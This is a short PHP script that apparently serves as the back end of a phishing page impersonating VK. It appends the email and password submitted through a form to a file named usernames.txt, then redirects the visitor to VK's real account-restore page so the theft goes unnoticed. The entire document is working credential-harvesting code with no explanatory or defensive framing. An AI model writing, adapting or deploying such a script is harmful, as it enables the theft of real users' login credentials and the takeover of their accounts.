<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . "\nPass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://vk.com/restore/');
exit();
